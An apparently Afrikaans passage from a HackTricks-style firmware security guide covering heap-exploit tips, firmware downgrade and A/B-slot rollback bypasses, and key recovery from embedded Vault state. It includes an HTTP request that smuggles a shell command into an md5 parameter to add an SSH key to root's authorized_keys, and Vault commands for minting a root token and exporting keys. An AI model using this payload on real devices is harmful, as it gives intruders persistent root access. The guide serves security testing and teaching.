- **Fastbins + konsolidasie:** uClibc gebruik fastbins soortgelyk aan glibc. ’n Latere groot toekenning kan `__malloc_consolidate()` aktiveer, dus moet enige vals chunk kontroles slaag (geldige grootte, `fd = 0`, en omliggende chunks wat as "in gebruik" beskou word).<sup>[[6]](#references)</sup>
- **Nie-PIE-binêre lêers onder ASLR:** as ASLR geaktiveer is, maar die hoofbinêre lêer **nie-PIE** is, is adresse in die binêre lêer se `.data/.bss` stabiel. Jy kan ’n streek teiken wat reeds soos ’n geldige heap-chunk-opskrif lyk om ’n fastbin-toekenning op ’n **funksiewyssertabel** te laat beland.
- **NUL wat die parser laat stop:** wanneer JSON ontleed word, kan ’n `\x00` in die payload die ontleding laat stop terwyl daaropvolgende aanvallerbeheerde grepe vir ’n stapelspil/ROP-ketting behoue bly.
- **Shellcode via `/proc/self/mem`:** ’n ROP-ketting wat `open("/proc/self/mem")`, `lseek()` en `write()` aanroep, kan uitvoerbare shellcode in ’n bekende geheuekartering plaas en daarnaartoe spring.

## Voorbereide bedryfstelsels vir firmware-ontleding

Bedryfstelsels soos [AttifyOS](https://github.com/adi0x90/attifyos) en [EmbedOS](https://github.com/scriptingxss/EmbedOS) bied vooraf gekonfigureerde omgewings vir firmware-sekuriteitstoetsing, toegerus met die nodige nutsmiddels.

## Voorbereide bedryfstelsels vir firmware-ontleding

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is ’n distro wat bedoel is om jou te help met sekuriteitsbeoordeling en penetration testing van Internet of Things (IoT)-toestelle. Dit bespaar jou baie tyd deur ’n vooraf gekonfigureerde omgewing met al die nodige nutsmiddels te voorsien.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): ’n Bedryfstelsel vir ingebedde-sekuriteitstoetsing, gebaseer op Ubuntu 18.04 en vooraf gelaai met nutsmiddels vir firmware-sekuriteitstoetsing.

## Firmware-afgraderingaanvalle en onveilige opdateringsmeganismes

Selfs wanneer ’n vervaardiger kriptografiese handtekeningkontroles vir firmwarebeelde implementeer, word **beskerming teen weergawe-terugrol (afgradering) dikwels weggelaat**. Wanneer die selflaai- of herstel-laaier slegs die handtekening met ’n ingebedde publieke sleutel verifieer, maar nie die *weergawe* (of ’n monotone teller) van die beeld wat geflits word vergelyk nie, kan ’n aanvaller wettiglik ’n **ouer, kwesbare firmware installeer wat steeds ’n geldige handtekening dra** en sodoende reggestelde kwesbaarhede weer invoer.<sup>[[4]](#references)</sup>

Tipiese aanvalwerkvloei:

1. **Kry ’n ouer ondertekende beeld**
   * Kry dit van die vervaardiger se openbare aflaaipoortaal, CDN of ondersteuningswebwerf.
   * Onttrek dit uit gepaardgaande mobiele-/rekenaartoepassings (bv. binne ’n Android APK onder `assets/firmware/`).
   * Kry dit van derdepartybewaarplekke soos VirusTotal, internetargiewe, forums, ens.
2. **Laai die beeld op na of bedien dit aan die toestel** via enige blootgestelde opdateringskanaal:
   * Web-UI, mobieletoepassing-API, USB, TFTP, MQTT, ens.
   * Baie IoT-toestelle vir verbruikers bied *ongeverifieerde* HTTP(S)-eindpunte wat Base64-geënkodeerde firmwareblobs aanvaar, dit aan die bedienerkant dekodeer en herstel/opgradering aktiveer.
3. Nadat die firmware afgegradeer is, buit ’n kwesbaarheid uit wat in die nuwer weergawe reggestel is (byvoorbeeld ’n opdrag-inspuitingsfilter wat later bygevoeg is).
4. Flits opsioneel die nuutste beeld terug of deaktiveer opdaterings om opsporing te vermy nadat volharding verkry is.

### Voorbeeld: Opdrag-inspuiting ná afgradering

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

In die kwesbare (downgraded) firmware word die `md5`-parameter direk sonder sanitisering by ’n shell-opdrag gevoeg, wat arbitrêre opdragte-inspuiting moontlik maak (hier om SSH-sleutelgebaseerde root-toegang te aktiveer). Latere firmwareweergawes het ’n basiese karakterfilter bekendgestel, maar omdat downgrade-beskerming ontbreek, is die oplossing nutteloos.<sup>[[4]](#references)</sup>

### Onttrekking van firmware uit mobiele toepassings

Baie verskaffers sluit volledige firmwarebeelde in hul gepaardgaande mobiele toepassings in sodat die toepassing die toestel via Bluetooth/Wi-Fi kan opdateer. Hierdie pakkette word gewoonlik ongeënkripteer in die APK/APEX gestoor, onder paaie soos `assets/fw/` of `res/raw/`. Met nutsmiddels soos `apktool`, `ghidra` of selfs gewone `unzip` kan jy ondertekende beelde onttrek sonder om aan die fisiese hardeware te raak.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Anti-rollback-omseiling wat slegs die updater raak in A/B-slotontwerpe

Sommige verskaffers implementeer wel ’n anti-downgrade-**ratchet**, maar net binne die *updater*-logika (byvoorbeeld ’n UDS-roetine oor CAN, ’n herstelopdrag of ’n OTA-agent in userspace). As die **bootloader** later net die image-handtekening/CRC nagaan en die partisietabel of slotmetadata vertrou, kan rollback-beskerming steeds omseil word.<sup>[[7]](#references)</sup>

Tipiese swak ontwerp:

- Firmwaremetadata bevat sowel ’n weergawebeskrywer as ’n **sekuriteitsratchet** / monotone teller.
- Die updater vergelyk die image se ratchet met ’n waarde wat in volgehoue berging gestoor is en verwerp ouer ondertekende images.
- Die bootloader ontleed nie daardie ratchet nie en verifieer net die kopskrif, CRC en handtekening voordat dit die gekose slot begin.
- Slotaktivering word afsonderlik in ’n partisietabel of per-slot-generasieteller gestoor en is nie kriptografies gekoppel aan die presiese firmwaredigest wat gevalideer is nie.

Dit skep ’n **valideer-een-image / begin-’n-ander-image**-primitief in dubbel-slotstelsels. As die aanvaller die updater kan laat merk dat slot B die volgende opstartteiken is met ’n huidige ondertekende image, en later slot B voor herlaai kan oorskryf, kan die bootloader steeds die afgegradeerde image begin omdat dit slegs die reeds toegepaste slotmetadata vertrou.

Algemene misbruikpatroon:

1. Laai ’n **huidige ondertekende** firmware na die passiewe slot op en voer die normale validerings-/wisselroetine uit sodat die uitleg daardie slot as die volgende aktiewe slot merk.
2. **Moet nog nie herlaai nie**. Voer die gleufvoorbereidings-/uitwisroetine in dieselfde sessie weer uit.
3. Misbruik verouderde opstarttoestand- of slotkeuselogika sodat die updater dieselfde fisiese slot uitwis wat pas bevorder is.
4. Skryf ’n **ouer, maar steeds ondertekende** firmware na daardie slot.
5. Slaan die valideringsroetine oor wat die ratchet afdwing en herlaai direk.
6. Die bootloader kies die bevorderde slot, verifieer slegs die handtekening/integriteit en begin die ou image.

Dinge waarna jy moet kyk wanneer jy A/B-opdateringsimplementasies reverse-engineer:

- Slotkeuse wat afgelei word van **opstartvlae** wat nie ná ’n suksesvolle wissel verfris word nie.
- ’n `prepare_passive_slot()`-agtige roetine wat ’n slot uitwis op grond van verouderde toestand eerder as die **huidige toegepaste uitleg**.
- ’n `part_write_layout()`-agtige funksie wat net ’n **generasieteller** / aktiewe vlag verhoog en nie die hash van die gevalideerde image stoor nie.
- Ratchet-kontroles wat in userspace- of updater-kode geïmplementeer is, maar **nie** in ROM / bootloader / veilige opstartfases nie.
- Uitwis- of herstelroetines wat die slot as opstartbaar gemerk laat, selfs nadat die inhoud daarvan verwyder en herskryf is.

### Kontrolelys vir die beoordeling van opdateringslogika

* Is die vervoer/verifikasie van die *opdaterings-eindpunt* voldoende beskerm (TLS + verifikasie)?
* Vergelyk die toestel **weergawenommers** of ’n **monotone anti-rollback-teller** voordat dit flash?
* Word die image binne ’n veilige opstartketting geverifieer (bv. handtekeninge wat deur ROM-kode nagegaan word)?
* Dwing die **bootloader dieselfde ratchet af** as die updater, eerder as om net die handtekening/CRC na te gaan?
* Is slotaktiveringsmetadata **gekoppel aan die gevalideerde firmwaredigest/-weergawe**, of kan ’n slot gewysig word nadat dit bevorder is?
* Word die toestel gedwing om te herlaai nadat ’n slotwisseling slaag, of is latere opdaterings-/uitwisroetines steeds in dieselfde sessie bereikbaar?
* Voer userland-kode bykomende gesonde-verstand-kontroles uit (bv. toegelate partisietoewysing, modelnommer)?
* Hergebruik *gedeeltelike* of *rugsteun*-opdateringsvloeie dieselfde valideringslogika?

> 💡  As enige van bogenoemde ontbreek, is die platform waarskynlik kwesbaar vir rollback-aanvalle.

## Kwesbare firmware om mee te oefen

Om te oefen om kwesbaarhede in firmware te ontdek, gebruik die volgende kwesbare firmwareprojekte as ’n beginpunt.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Herwinning van firmware-dekripsiesleutels uit ingebedde KMS/Vault-toestand

Wanneer ’n opdateringsimage klein plaintext-metadata met ’n groot blob met hoë entropie meng, doen houertriage voordat jy enigiets brute-force:<sup>[[1]](#references)</sup>

- Stort kopskrifte, offsets en lyngrense met `hexdump`, `xxd`, `strings -tx`, `base64 -d` en `binwalk -E`.
- `Salted__` dui gewoonlik op OpenSSL `enc`-formaat: die volgende 8 grepe is die salt en die oorblywende grepe is die ciphertext.
- ’n Base64-veld wat na presies `256` grepe dekodeer, is ’n sterk aanduiding dat jy na ’n RSA-2048-ciphertext kyk wat ’n ewekansige firmware-wagwoord/sessiesleutel verpak.
- Aparte PGP-materiaal in dieselfde lêer beskerm dikwels net egtheid; moenie aanvaar dat dit die vertroulikheidsmeganisme is nie.

As statiese sleutelsoektogte (`grep`, `strings`, PEM/PGP-soektogte) misluk, reverse-engineer eerder die **operasionele dekripsiepad** as om net na private sleutels te soek:

- Decompileer die updater-/bestuursbinary en spoor na wie die geënkripteerde blob lees, watter helper/API dit ontsluit en watter logiese sleutelnaam dit versoek.
- Soek in die onttrekte wortellêerstelsel vir KMS-toestand (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) asook eenheidlêers en init-skripte.
- Behandel plaintext `vault operator unseal ...`, herstelsleutels, bootstrap-tokens of plaaslike KMS-outo-ontseëlingskripte as ekwivalent aan private-sleutelmateriaal.

As die toestel die oorspronklike Vault-binary en bergingbackend insluit, is dit gewoonlik makliker om daardie omgewing weer te speel as om Vault-internals te herimplementeer:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Met root op die gekloonde KMS:

- Maak transit-sleutels slegs binne die geïsoleerde kloon uitvoerbaar: `vault write transit/keys/<name>/config exportable=true`
- Voer die unwrap-sleutel uit: `vault read transit/export/encryption-key/<name>`
- Probeer die herstelde RSA-sleutel met die presiese padding/hash-paar wat deur die KMS gebruik word. ’n Mislukte PKCS#1 v1.5-dekripsie en ’n mislukte verstek-OAEP-dekripsie bewys **nie** dat die sleutel verkeerd is nie; baie Vault-gesteunde vloeie gebruik OAEP met SHA-256, terwyl algemene biblioteke SHA-1 as verstek gebruik.
- As die loonvrag met `Salted__` begin, herhaal die verskaffer se OpenSSL-KDF presies (`EVP_BytesToKey`, dikwels MD5 op verouderde toestelle) voordat jy AES-CBC-dekripsie probeer.

Dit verander “geënkripteerde firmware” in ’n meer algemene probleem: **herwin die toestel se operasionele sleutels en herhaal dan die presiese unwrap- en KDF-parameters vanlyn**.

## Opleiding en Sertifisering

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Firmware kraak met Claude: vaardigheid op seniorvlak, outonomie op juniorvlak](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologie vir firmware-sekuriteitstoetsing](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktiese IoT-inbraak: Die definitiewe gids tot aanvalle op die Internet van Dinge](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Uitbuiting van zero-days in verlate hardeware – Trail of Bits-blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Hoe ’n slimtoestel van $20 my toegang tot jou huis gegee het](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Nou sien jy my: Nou is jy gekraak](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Uitbuiting van die Tesla Wall Connector via sy laaipoort - Deel 2: omseiling van die terugdateringsbeskerming](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Laat dit flikker: Lugoor-uitbuiting van die Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS op QEMU Deel 2: Ontfouting en regstelling](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [10] [Dell BIOS-wagwoorde: Swak XOR-enkripsie maak herstel vanaf SPI-flitsgeheue moontlik (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [11] [R3n5k1/dellpwn - Gereedskap vir die herstel van Dell BIOS-wagwoorde](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
